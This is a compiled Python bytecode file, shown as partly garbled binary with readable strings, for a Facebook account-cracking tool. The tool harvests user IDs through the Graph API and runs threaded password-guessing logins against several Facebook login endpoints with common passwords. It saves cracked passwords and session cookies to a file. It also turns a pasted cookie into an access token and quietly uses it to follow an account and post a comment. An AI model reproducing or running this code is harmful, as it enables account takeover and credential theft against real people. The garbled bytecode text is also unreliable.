o
    ???b5?  ?                   @   s0  zTd dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ W n eyl Z zeee?? W Y dZ[ndZ[ww d dl Z zd dlZW n ey?   ed? e ?d? Y nw zd dlZW n ey?   ed	? e ?d
? Y nw zd dlZW n ey?   ed? e ?d? Y nw d dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dl
Z
d dlZd dlZd dlZd dlZd dlZd dlmZ  d dlmZ d dlmZ dd? Z!e!?  e?"? Z#e#j$Z%g d?Z&ze%d k ?se%dk?r"e?  e%d Z'W n e(?y4   e?  Y nw e?"? Z)e)j$Z*g d?Z+ze*d k ?sKe*dk?rNe?  e*d Z'W n e(?y`   e?  Y nw e?"? Z,e,j-Z.e+e' Z&e,j/Z0e,j$Z1de.e&e0f Z2ddddddddddddd ?Z3ze?4d!?j5Z6e7d"d#??8e6? W n   Y d$Z9d%Z:d&Z;d'Z<d(Z=d)Z>d*Z?d+Z@d,ZAg g g g g d f\ZBaCaDaEaFaGe
?He7d"d-??I? ?J? ?ZKd.d/? ZLd0d1? ZMd2d3? ZNd4d5? ZOd6d7? ZPd8d9? ZQd:d;? ZRd<d=? ZSd>d?? ZTd@dA? ZUdBdC? ZVdDdE? ZWG dFdG? dG?ZXdHdI? ZYdJdK? ZZdLdM? Z[e\dNk?reR?  dS dS )O?    N)?track)?sleep)?datetime)?ThreadPoolExecutor)?BeautifulSoupu)   
 [×] requests module not installed!...
zpip install requestsu(   
 [×] Futures module not installed!...
zpip install futuresu$   
 [×] Bs4 module not installed!...
zpip install bs4c                  C   s?   t t?? ?t t?? ? } d?| ?}t?d? t?d? td| ? z1t?d?j	}||v r>td? t t?? ?}t
?d? W d S td? t?d	? t
?d
? t??  W d S    t??  tdkrhtt? t?  Y d S Y d S )N?-?clearzfiglet ID Activez[37;92mYOUR ID : zhttps://pastebin.com/7MHy9yFkz[1;92mYOUR ID IS ACTIVE...!g333333??z5[1;92mYour Id Not Active Send Me For Active 
@FFRFF3zxdg-open https://t.me/FFRFF3?   ?main)?str?os?geteuid?getlogin?join?system?print?requests?get?text?timer   ?sys?exit?name?logo?xoshnaw)?uuid?idZhttpCaht?msg? r   ?$/storage/emulated/0/Download/File.pyr   (   s,   





?r   )ZJANZFEBZMARZAPRZMAYZJUNZJULZAUGZSEPZOCTZNOVZDEC?   r	   )?Januari?Februari?Maret?April?Mei?Juni?Juli?Agustus?	September?Oktober?November?Desemberz%s-%s-%sr!   r"   r#   r$   r%   r&   r'   r(   r)   r*   r+   r,   )?01?02?03?04?05?06?07?08?09?10?11?12zwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	proxi.txt?wz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mz[0mz[1;90m?rc                   C   s   t t? d?? d S )Nu?  
	
▄▄▄█████▓ ▒█████   ██ ▄█▀▓██   ██▓ ▒█████  
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▒██  ██▒▒██▒  ██▒
▒ ▓██░ ▒░▒██░  ██▒▓███▄░   ▒██ ██░▒██░  ██▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄   ░ ▐██▓░▒██   ██░
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄  ░ ██▒▓░░ ████▓▒░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒   ██▒▒▒ ░ ▒░▒░▒░ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▓██ ░▒░   ░ ▒ ▒░ 
  ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ▒ ░░  ░ ░ ░ ▒  
             ░ ░  ░  ░    ░ ░         ░ ░  
                          ░ ░              
)r   ?Ur   r   r   r   r   r   s   r   c                   C   sV   t dt? dt? dt? t? ?? t dt? dt? dt? t? ?? t dt? dt? d?? d S )	N?
 zSUCESS SAVE IN : zresults/OK-zCHECKPOINT SAVED IN : zresults/CP-z)
  BRUTE HAS BEEN STARTED WAIT AND SEE Y zX ?X)r   ?A?H?
_datetime_?N?K?Mr   r   r   r   ?starting?   s   rD   c              	   C   s?   t | ?dkst |?dkr=tdt? d?? tdt? dt? dt? t | ?? ?? tdt? dt? dt? t |?? ?? t?d? d S td? t?  d S )	Nr   ? zCRACK COMPILET...zTOTALL z	SUCESS : zCHECKPOINT : ZEXITz
 Not SUCESS and CHECKPOINT )	?lenr   rA   r>   r?   rB   r   r   r   )?ok?cpr   r   r   ?hasil?   s   ""
rI   c                   C   sN   t d? t dt? dt? d?? t dt? dt? d?? t dt? dt? d?? d S )	Nz
CHOICE METHODrE   ?(01) zTouch.facebook.com?(02) zMbasic.facebook.com?(03) zMobile.facebook.com)r   r>   r   r   r   r   ?metode?   s   rM   c                  C   s~  t ?d? t?  tdt? dt? dt? dt? ??} | dv r!t?  d S ddd	d
dddd| d?	}z=tj	d|d?}t
?d|j??d?}d|v rhtdt? dt? |? t? ?? tdd??|? tdd??| ? t| ? W d S W d S  ty?   tdt? d?? t?d? t?  Y d S  ty?   tdt? dt? dt? d?? t?d? t?  Y d S  tjjy?   tdt? d ?? t?d? t?  Y d S w )!Nr   rE   ?<z> zINPUT COOKIE  : ?? rE   zbusiness.facebook.com?	max-age=0?1z?Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8zgzip, deflate?#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)	?Host?cache-control?upgrade-insecure-requests?
user-agent?accept?content-type?accept-encoding?accept-language?cookiez0https://business.facebook.com/business_locations??headersz	(EAAG\w+)r	   ZEAAGr<   zYOR TOKEN : ?Data/Token.txtr9   ?Data/cokie.txt?
zCookie invalid?   ?   •?   • zcookie invalidz FIELD  )r   r   r   ?inputr?   rB   rA   ?masukr   r   ?re?searchr   ?groupr   ?open?write?comen?AttributeErrorr   r   ?UnboundLocalErrorrC   ?
exceptions?TooManyRedirects)?cokisZ	data_head?linkZcolir   r   r   rf   ?   s*    
??2>8rf   c                 C   sl   | }t dd??? }tjd|? ?d|id? tjd|? d|? ?d|id? td	t? d
?? t?d? t?  d S )Nr_   r:   zKhttps://graph.facebook.com/100000626195514?fields=subscribers&access_token=r\   r]   zMhttps://graph.facebook.com/100050202525858_558680179148728/comments/?message=z&access_token=zLOGINED SUCESSr<   z LOGINED SUCESSrb   )	rj   ?readr   ?postr   rA   r   r   ?menu)rq   Zkuki?toketr   r   r   rl   ?   s   
rl   c                  C   s?  t ?d? ztdd??? } tdd??? }W n ty-   tt? d?? t?d? t	?  Y nw z)tdd??? }tdd??? }t
jd|? ?d|id	??? d
 }t
?d??? d }W n6 ty{   tdt? dt? dt? d?? t ?d? t?d? t	?  Y n t
jjy?   tdttf ? Y nw t?  tdt? dt? |? ?? tdt? dt? |? ?? td? tdt? dt? dt? ?? tdt? dt? dt? ?? tdt? dt? d?? tdt? dt? ??}t|| |? d S )Nr   r_   r:   r`   z LOGIN AGIN rb   z6https://graph.facebook.com/me?metadata=1&access_token=r\   r]   r   zhttps://www.httpbin.org/ip?originrE   rc   rd   zcokie invalid?.rm -rf Data/Token.txt && rm -rf Data/cokie.txtu    [%s×%s] NOT CONNECT INTRNETr<   zWelcome Pro : zYour IP Address : rP   rJ   zCRACK ID PUBLICrK   zCRACK ID PUBLIC LIMTIrL   ZLOGOUTz[#] CHOICE : )r   r   rj   rs   ?FileNotFoundErrorr   r?   r   r   rf   r   r   ?json?KeyErrorrC   rB   rA   ro   ?ConnectionErrorr   r   r>   re   ?pilihan)?token?cokierv   ZkukisZkamu?ip?memecr   r   r   ru   ?   s.   
"? :&ru   c              
   C   sh  | dv r	t ?  d S | dv rtdt? dt? d??}t|?S | dv r%t||?S | dv rKtdt? dt? d	t? d
?? tdt? dt? d	t? d??}t	|||?S | dv r?tdt? dt? d	t? d?? tdt? dt? d	t? d??}|dv rst ?  nt
|d??? }|D ]}t?|? q|tdt? dt? d	t? dtt?? ?? t? ?t?S | dv r?tdt? dt? d	t? d?? tdt? dt? d	t? d??}t|||?S | dv ?r<tdt? dt? d	t? d?? tdt? dt? d	t? d??}zt
d| d??? ?? }	W n ty?   td? Y nw |	D ]9}
|
?dd?}|?d?}td|?dd? ? zt|d ?dd?|d ? W ?q  tjj?y9   t?d? Y ?q w d S | dv ?r?td? t?d?}|D ]	}td | ? ?qLtd!tttf ?}|dv ?rit ?  d S zt
d"| d??? ?? }W n t?y?   td#| ? Y nw |D ]}t|? ?q?d S | d$v ?r?t? d%? td&? d S | d'v ?r?t? d(? d S t ?  d S ))NrO   ?rR   r-   r<   z
ID PUBLIC:rE   ??2r.   ??9r5   rc   rd   z3Ketik 'me' jika crack dari daftar followers sendirizMasukan Id : )?4r0   z1Jika tidak ada file silakan buat terlebih dahulu!zNama file : r:   z Total id : )?5r1   z,Pastikan id bersifat publik & memiliki likeszMasukan ID : )?6r2   z1Masukan nama file anda yang berisi akun chekpoint?resultsz
 Nama file tidak ada !rP   ?|z --> Chek akun : z | r   r	   rb   )?7r3   z File : u#   
 %s•%s• %sMasukan nama file : zData/z
 File : %s Tidak ada??3r/   rx   z
 Sukses menghapus data masuk)?0Z00r   )!ru   re   r>   r?   ?publik?masalr   rB   rA   ?	followersrj   ?	readlinesr   ?appendrF   ?
bruteforce?	__class__?likesrs   ?
splitlinesry   r   ?replace?splitr
   r   ro   r|   r   r   r   ?listdirr   )r?   r~   r   ?idneZfilex?ioZ	memekkamu?_uid_Z	nama_fileZnamaZakunzZopsi_Zitil?fileZkontol_pepek_split_anakZfilzZmy_hasil?colmekr   r   r   r}   ?   sv   
$
?
 $?

??


r}   c                 C   s?   zIt dd??? }tjd| ? d|? ?dt dd??? id??? }|d d	 D ]}t?|d
 d |d  ? q$tdt? dt	? dt
t?? ?? t? ?t?W S  tyc   tdt	? d?? t?d? t?  Y d S w )Nr_   r:   zhttps://graph.facebook.com/z)?fields=friends.limit(5001)&access_token=r\   r`   r]   ?friends?datar   ?<=>r   r<   ?
TOTAL ID :rE   z YOUR ID NOT PUBLICrb   )rj   rs   r   r   rz   r   r?   r   r>   r?   rF   r?   r?   r{   r   r   ru   )r?   ?xxZ_url_Z
_khamdihi_r   r   r   r?     s   ,4r?   c              
   C   s?   zt tdt? dt? d???}W n   d}Y t|?D ]C}|d7 }tdt? dt? d??}z'tjd|| f d|id??? }|d	 d
 D ]}t?	|d d |d  ? qAW q t
tfy]   Y qw tdt? dt? dtt?? ?? t? ?t?S )Nr<   z
LIMTI ID :rE   r	   z
INPUT ID :zHhttps://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%sr\   r]   r?   r?   r   r?   r   r?   )?intre   r>   r?   ?ranger   r   rz   r   r?   r{   ?IOErrorr   rF   r?   r?   )r~   r   ZtambahZikehikehkimcohikhamr?   ?userZxnxxr   r   r   r?     s    ??r?   c              	   C   s?   z't jd| |f d|id??? }|d d D ]}t?|d d |d  ? qW n ttfyB   td	t? d
?? t	?
d? t?  Y nw td	t? dt? dtt?? ?? t? ?t?S )Nzehttps://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(99999999)&access_token=%sr\   r]   Zsubscribersr?   r   r?   r   r<   zYOUR ID NOT PUBILCrb   r?   rE   ?r   r   rz   r   r?   r{   r?   r   r?   r   r   ru   r>   rF   r?   r?   )r?   r~   r   ZresponsZfollowerr   r   r   r?   '  s   ?$?r?   c              	   C   s?   z%t jd| |f d|id??? }|d D ]}t?|d d |d  ? qW n ttfy@   tdt? d	?? t	?
d
? t?  Y nw tdt? dt? dtt?? ?? t? ?t?S )NzGhttps://graph.facebook.com/%s?fields=likes.limit(10000)&access_token=%sr\   r]   r?   r   r?   r   r<   zID NOT PUBILC?   r?   rE   r?   )r?   r~   r   ZlikeZselebmemekcolmekburikasur   r   r   r?   1  s   ?$?r?   c                   @   sd   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? Zdd? Zdd? Z	dd? Z
dd? Zdd? Zdd? ZdS )r?   c                 C   s
   g | _ d S )N)r   )?selfr   r   r   ?__init__<  s   
zbruteforce.__init__c                 C   s?   t dt? d?? tdt? dt? d??}|dv rt|? n|dv r&t?d? nt?d? t dt? d	?? tdt? dt? d
??}|dv rIt?  | ?	? S |dv rVt?d? | ?	? S t?d? | ?	? S )Nra   zSHOW YOUR APP Yes/No  ?[#] CHOICE :z  rO   )?Yesr?   r?   ZNozSHOW YOR CHECKPOINT: Yes/No rE   )
r   r>   re   r?   Z
beuteforce?apkr?   ru   ?opsi?wordlist)r?   r   ZpilihZ_code_r   r   r   r?   >  s   
?
?zbruteforce.__class__c                 C   sP   t dt? d?? t dt? d?? tdt? dt? d??}t?d? t?  | ?|?S )Nra   z(01) CRACK WITH AUTO PASSz((02) CRACK WITH AUTO PASS AND DIGIT PASSz[#]CHOICE :rE   r   )r   r>   re   r?   r   r   r   ?masukan_pass)r?   ?__pw__r   r   r   r?   L  s
   
zbruteforce.wordlistc                 C   s?   |dv r	t ?  d S |dv r3tdt? d?? tdt? dt? d??}t|?dkr,td	? d S | ?|? d S |d
v r@t	?  | ?
?  d S |dv rstdt? dt? dt? d?? tdt? dt? dt? d??}t|?dkrltd? d S | ?|? d S tdt? d?? d S )NrO   r?   r<   zINPUT YOUR PASSWORD ra   z
PASSWORD :rE   ?   z
 GET 6 PASWORD!r?   r?   rc   rd   z*Gunakan koma untuk pemisahan password nya!zPassword : z
 Gunakan 6 katakter!zinput anda salah)ru   r   r>   re   rA   r?   rF   r   ?manualrM   ?otomatisrB   ?gabunganrC   )r?   r?   ?_pepek_?_pasx_r   r   r   r?   S  s   zbruteforce.masukan_passc                 C   s8  t ?  tdt? dt? d??}|dv rdt?  tdd??;}tD ]0}z|?d?\}}|?| j	||?d?? W q t
yI } z
t|? W Y d }~qd }~w   Y qW d   ? n1 sXw   Y  ttt? d S |d	v r?t?  tdd??;}tD ]0}z|?d?\}}|?| j||?d?? W qs t
y? } z
t|? W Y d }~qsd }~w   Y qsW d   ? n1 s?w   Y  ttt? d S |d
v ?rt?  tdd??;}tD ]0}z|?d?\}}|?| j||?d?? W q? t
y? } z
t|? W Y d }~q?d }~w   Y q?W d   ? n	1 ?sw   Y  ttt? d S tdt? d?? d S )Nra   r?   rE   r?   ?   ?Zmax_workersr?   ?,r?   r?   r<   zInput yang kamu masukan salah!.)rM   re   r>   r?   rD   ?
khamdihiXDr   r?   ?submit?touch?	Exceptionr   rI   rG   rH   ?mbasic?mobiler   rC   )r?   r?   Z_ceh_?unikersZacount?uidr   ?errorr   r   r   r?   e  sT   "?
??"?
??
"?
??zbruteforce.manualc           
      C   s6  t dt? dt? d??}|dv rt?  d S |dv r?t?  tdd??^}tD ]S}z7|?d?\}}|?d?}t|?d	ksJt|?d
ksJt|?dksJt|?dkrOg d?}ng d?}|?	| j
||? W q# tyr } z
t|? W Y d }~q#d }~w   Y q#W d   ? n1 s?w   Y  ttt? d S |dv ?rt?  tdd??b}tD ]W}z;|?d?\}}|?d?}t|?d	ks?t|?d
ks?t|?dks?t|?dkr?g d?}ng d?}g d?}|?	| j||? W q? ty? }	 z
t|	? W Y d }	~	q?d }	~	w   Y q?W d   ? n1 s?w   Y  ttt? d S |dv ?r?t?  tdd??f}tD ][}z<|?d?\}}|?d?}t|?d	k?sFt|?d
k?sFt|?dk?sFt|?dk?rKg d?}ng d?}|?	| j||? W ?q t?yq }	 zt|	? W Y d }	~	?qd }	~	w   Y ?qW d   ? n	1 ?s?w   Y  ttt? d S tdt? d?? t?  d S )Nr<   z[#] CHOICE:rE   )rP   r?   r?   r?   r?   rb   ?   r?   ?   ?Z
1122334455Z
1234512345Z1998998Z19971997Z20002000Z19991999Z19961996Z20012001r?   r?   zPilih input yang bener)re   r>   r?   ru   rD   r?   r   r?   rF   r?   r?   r?   r   rI   rG   rH   r?   r?   rC   r   )
r?   Z_kopi_r?   Zakunr?   r   Z	usernamee?pwxZasur?   r   r   r   r?   ?  sn   
0
"?
??

0
"?
??

8
&???zbruteforce.otomatisc           
      C   s(  t ?  tdt? dt? ??}|dv rt?  d S |dv r?t?  tdd??^}tD ]S}z7|?d?\}}|?d?}t	|?dksLt	|?d	ksLt	|?d
ksLt	|?dkrQg d?}ng d?}|?
| j||? W q% tyt }	 z
t|	? W Y d }	~	q%d }	~	w   Y q%W d   ? n1 s?w   Y  ttt? d S |dv ?r	t?  tdd??^}tD ]S}z7|?d?\}}|?d?}t	|?dks?t	|?d	ks?t	|?d
ks?t	|?dkr?g d?}ng d?}|?
| j||? W q? ty? }	 z
t|	? W Y d }	~	q?d }	~	w   Y q?W d   ? n1 s?w   Y  ttt? d S |dv ?r?t?  tdd??f}tD ][}z<|?d?\}}|?d?}t	|?dk?sDt	|?d	k?sDt	|?d
k?sDt	|?dk?rIg d?}ng d?}|?
| j||? W ?q t?yo }	 zt|	? W Y d }	~	?qd }	~	w   Y ?qW d   ? n	1 ?s?w   Y  ttt? d S tdt ? d S )NrE   z[#] CHOICE: rO   r?   r?   r?   r?   rb   r?   r?   r?   r?   r?   r?   z"
 %sInput yang anda masukan salah!)rM   re   r>   r?   ru   rD   r?   r   r?   rF   r?   r?   r?   r   rI   rG   rH   r?   r?   r   rC   )
r?   r?   Z_lover_ZcuihZasuhr?   r   r?   r?   ?er   r   r   r?   ?  sn   
0
"?
??

0
"?
??

8
&???zbruteforce.gabunganc                 C   sj  t ?tttttttg?}t	j
?dtt|ttt?tt?tt?f ? t	j
??  z?|D ]?}t?? }dddddddd	d
d	dddd?}|?d| ?}t?dt|j???d?t?dt|j???d?|d|dd?}i dd?dd?dd?dd	?dd?dd?dd?d d!?d"d?d#d?d$d?d%d?d&d	?d'd
?d(d)?d*d?d+d?}	|jd,||	d-d.?}
d/|j?? v r?d0?d1d2? tj?? ?? D ??}t d3t? d4|? d5|? d6|? ?? t?!t? d4|? d5|? d6|? ?? d7|||f }t"d8d9t# ??|?  n2d:|j?? v ?rt d3t? d;|? d<|? ?? t?!|? d<|? ?? d=||f }t"d>d9t$ ??|?  nq)td7 aW d S  tj%j&?y4   t'?(d?? Y d S w )@N?7 %s<%s> %s[ CHECK ] %s/%s [SUCESS:%s] [CHECKPOINT:%s].ztouch.facebook.comrQ   rR   ?|Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36??text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9?same-origin?navigate??1?documentzhttps://touch.facebook.com/?gzip, deflate, brrS   ?rT   rU   rV   rW   rX   ?sec-fetch-site?sec-fetch-mode?sec-fetch-user?sec-fetch-dest?sec-ch-ua-mobile?refererrZ   r[   zghttps://touch.facebook.com/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr?name="lsd" value="(.*?)"r	   ?name="jazoest" value="(.*?)"?login_no_pinz-https://touch.facebook.com/login/save-device/??lsd?jazoestr?   Zflow?pass?nextrT   ?content-lengthZ320rU   r?   zsec-ch-ua-platformz	"Android"rV   rw   zhttps://touch.facebook.comrY   ?!application/x-www-form-urlencodedrW   rX   r?   r?   r?   r?   r?   zkhttps://touch.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdrrZ   r[   zGhttps://touch.facebook.com/login/device-based/validate-password/?shbl=0T?r?   r^   ?allow_redirects?c_user?;c                 S   s   g | ]
\}}|d  | ?qS )?=r   ??.0?key?valuer   r   r   ?
<listcomp>  ?    z$bruteforce.touch.<locals>.<listcomp>rE   ?* 
[+]SUCESS  
[+]ID: ?

[+]PASS: ?
[+]COOKIE:z	%s|%s|%s
?/sdcard/SUCESS.txt?a?
checkpointz* --> r?   z%s|%s
?Results/CP-%s?2   ))?random?choicerC   rB   r?   r;   ?P?OrA   r   ?stdoutrk   ?looprF   r   rG   rH   ?flushr   ?Sessionr   rg   rh   r   r   ri   rt   ?cookies?get_dictr   ?session?itemsr   r?   rj   ?	_datetimer@   ro   r|   r   r   )r?   r?   r?   ?warna?pw?ses?head?pZdataa?headerZpo?coki?_wrt_r   r   r   r?   ?  s?   4?:????????	?
????????  ?zbruteforce.touchc                 C   s6  t ?tttttttg?}t	j
?dtt|ttt?tt?tt?f ? t	j
??  z?|D ]?}t?? }t ?g d??}ddd|dddd	d
d	dddd?}|?d|? d??}t?dt|j???d?t?dt|j???d?|d|dd?}	dddd	dddddddd	d
ddd?}
|jd|	|
dd?}d|j?? ?? v r?d ?d!d"? |j?? ?? D ??}t d#t? d$|? d%|? d&|? ?? t?!t? d$|? d%|? d&|? ?? d'|||f }t"d(d)??|?  n2d*|j?? ?? v ?rt d#t? d+|? d,|? ?? t?!|? d,|? ?? d-||f }t"d.d)??|?  nq)td7 aW d S  tj#j$?y   t%?&d/? Y d S w )0Nr?   )z?Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]??Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36z?Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)z?Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36z{Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36z?Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36?mbasic.facebook.comrQ   rR   r?   r?   r?   r?   r?   zhttps://mbasic.facebook.com/r?   rS   r?   ?=https://mbasic.facebook.com/login/device-based/password/?uid=?)&flow=login_no_pin&refsrc=deprecated&_rdrr?   r	   r?   r?   z.https://mbasic.facebook.com/login/save-device/r?   Z145?https://mbasic.facebook.comr?   r  )rT   r?   rU   r?   rV   rw   rY   rW   rX   r?   r?   r?   r?   rZ   r[   ?Hhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0Tr?   r?   r?   c                 S   ?   g | ]
\}}d ||f ?qS ?z%s=%sr   r?   r   r   r   r?   c  r?   z%bruteforce.mbasic.<locals>.<listcomp>? r?   r?   r?   ?	
%s|%s|%sr?   r?   r?   z*  --> r?   ?
%s|%szCP.txt?   )'r?   r?   rC   rB   r?   r;   r?   r?   rA   r   r?   rk   r?   rF   r   rG   rH   r?   r   r?   r   rg   rh   r   r   ri   rt   r   r  ?keysr   r  r   r?   rj   ro   r|   r   r   )r?   r?   r?   r  r  r  Zuar  ?x?cariZheader_postrI   r  r  r   r   r   r?   0  s~   4??	?  ?zbruteforce.mbasicc                 C   s,  t ?tttttttg?}t ?tttttttg?}tj	?
d|||ttt?tt?tt?f ? tj	??  |D ?]Z}?zFt?? }ddddddddd	d
dd?}|?d|? d??}t?dt|j???d?t?dt|j???d?|d|dd?}	i dd?dd?dd?dd?dd?dd?dd?d d?d!d?d"d#?d$d?d%d?d&d	?d'd(?d)d
?d*d?}
|jd+|	|
d,d-?}d.|j?? ?? v ?r&d/tv r?d0?d1d2? |j?? ?? D ??}t d3? t?!d4|||f ? t"d5d6t# ??
d7|||f ? t$|? n8d0?d8d2? |j?? ?? D ??}t d9t? d:|? d;|? d<|? ?? t?!d4|||f ? t"d5d6t# ??
d7|||f ? W  njd=|j?? ?? v ?r}d/t%v ?rZt d>||f ? t?!d?||f ? t&||? t"d@d6t# ??
dA||f ? n t d>t||f ? t?!d?||f ? t"d@d6t# ??
dA||f ? W  nW q4 tj'j(?y?   t)?*dB? Y q4w td7 ad S )CNr?   r  r?   rR   zGMozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5r?   ?noner?   r?   r?   rS   )rT   r?   rV   rW   rX   r?   r?   r?   r?   rZ   r[   r  r  r?   r	   r?   r?   z8https://developers.facebook.com/tools/debug/accesstoken/r?   rT   r?   Z275rU   rQ   r?   rV   rw   r  rY   r?   rW   rX   r?   r?   r?   r?   r?   r?   zjhttps://mbasic.facebook.com/login/device-based/password/?uid={id}&flow=login_no_pin&refsrc=deprecated&_rdrrZ   r[   r  Tr?   r?   ?yr?   c                 S   r  r  r   r?   r   r   r   r?   ?  r?   z%bruteforce.mobile.<locals>.<listcomp>zA  {H}* 
[+]SUCESS  
[+]ID: {user}
[+]PASS: {pw}
[+]COOKIE:{coki}z%s|%s|%sr?   r?   r  c                 S   r  r  r   r?   r   r   r   r?   ?  r?   r  r?   r?   r?   r?   z %s*  --> %s|%s?%s|%sr?   r  r?   )+r?   r?   rC   rB   r?   r;   r?   r?   r   r?   rk   r?   rF   r   rG   rH   r?   r   r?   r   rg   rh   r   r   ri   rt   r   r  r  r?   r   r  r   r?   rj   r@   ?cek_aplikasir?   ?cek_opsiro   r|   r   r   )r?   r?   r?   ?st?tsr  r  r  Zpost_1Zdata_1Zhead_1Zpost_2r  r   r   r   r?   u  s?   4
?:????????	?
???????
 

"zbruteforce.mobilec           	      C   sV  t j?dttt?ttt?tt	tt
?tf ? t j??  |D ]?}t?? }|?d?}t?dt|j???d?t?dt|j???d?t?dt|j???d?t?dt|j???d?dd||d	dd
?
}|jd|d?}d|j?? v r?d?dd? |j?? ?? D ??}td? t?d||f ?  nd|j?? v r?tdt	||f ? t
?d||f ?  nqtd7 ad S )Nz Crack: %s/%s %s%s%s/%s%s%s?%https://mbasic.facebook.com/login.phpr?   r	   r?   ?name="m_ts" value="(.*?)"?name="li" value="(.*?)"r?   ?Masuk?
r?   r?   Zm_tsZliZ
try_numberZunrecognized_tries?emailr?   ?loginZbi_xrwh?r?   r?   r?   c                 S   r  r  r   r?   r   r   r   r?   ?  r?   z%bruteforce.kontol.<locals>.<listcomp>zA%s{H}* 
[+]SUCESS  
[+]ID: {user}
[+]PASS: {pw}
[+]COOKIE:{coki}r  r?   z%s *  --> %s|%s)r   r?   rk   r?   rF   r   r?   rG   rA   rB   rH   r?   r   r?   r   rg   rh   r   r   ri   rt   r   r  r   r  r   r?   )	r?   r?   r?   r  r  ?urlr?   rt   r  r   r   r   ?kontol?  s0   6
?zbruteforce.kontolN)?__name__?
__module__?__qualname__r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r,  r   r   r   r   r?   ;  s    $35?EFr?   c                 C   s
  z?t ?? }|jdd| id?}t|jd?}|?dddi?}dd	? |?d
?D ?}t|?dkr1td? nt	t|??D ]}td|d || ?
dd?f ? t?d? q7|jdd| id?}t|jd?}|?dddi?}	dd	? |	?d
?D ?}t|?dkr{td? nt	t|??D ]}
td|
d ||
 ?
dd?f ? t?d? q?zM|jdd| id?}t|jd?}|?dddi?}	dd	? |	?d
?D ?}t|?dkr?td? nt	t|??D ]}td|d || ?
dd?f ? q?W W d S W W d S  ty?   td? Y W d S w  t?y   td? Y d S w )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer\   )r   ?html.parser?form?methodrt   c                 S   ?   g | ]}|j ?qS r   ?r   )r?   ?memekr   r   r   r?   ?  ?    z cek_aplikasi.<locals>.<listcomp>Zh3r   z    Tidak ada aplikasi aktifz
    %s %s r	   z Di akses pada zDi tambahkan padaz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   r3  r   r4  )r?   Zkontol_r   r   r   r?   ?  r6  z#    Tidak ada aplikasi kadarluarsaz

    %s %szKadarluarsa padazTidak di akses padaz=https://mbasic.facebook.com/settings/apps/tabbed/?tab=removedc                 S   r3  r   r4  )r?   Z_kontol_r   r   r   r?   ?  r6  z%    Tidak ada aplikasi di yanh hapuszDi hapus padazDi hapusz3    Tidak ada aplikasi yang di hapus/cokie invalid!u    × cokie invalid)r   r?   r   ?parserr   ?find?find_allrF   r   r?   r?   r   r   rm   )r  r  r+  ZpsotZfickZgamer,  rr   rt   r  Zaplikasir?   r   r   r   r  ?  sF   
,
,
"???r  c                 C   s?  z?t ?? }dddddddddd	d
d?}|?d?}t?dt|j???d?t?dt|j???d?t?dt|j???d?t?dt|j???d?dd| |ddd?
}|jd|d?}d|j	?
? v rbtd? W d S d|j	?
? v r?t|jd?}|?dddi?d }t?dt|j???d?t?dt|j???d?dd t?d!t|j???d?d"?}	|jd#| |	d?}
t|
jd?}|?d$?}t|?d%kr?td&? W d S |D ]}td'|j ? t?d? q?W d S td(? W d S    Y d S ))Nr  rR   r?   r?   r  r?   r?   r?   r?   rS   ?rT   rV   rW   rX   r?   r?   r?   r?   r?   rZ   r[   r#  r?   r	   r?   r$  r%  r?   r&  r'  r*  r?   u"   
